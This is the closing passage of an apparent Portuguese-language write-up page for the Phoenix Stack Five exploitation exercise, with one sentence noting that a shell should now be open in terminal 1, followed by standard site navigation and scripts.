<p>Agora, no terminal 1 deve ter uma shell :D</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                            <a rel="prev" href="../phoenix/StackFour.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        

                        
                            <a rel="next" href="../phoenix/StackSix.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                    <a rel="prev" href="../phoenix/StackFour.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a rel="next" href="../phoenix/StackSix.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3000/__livereload");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        

        
        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        

        

        
        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        

    </body>
</html>
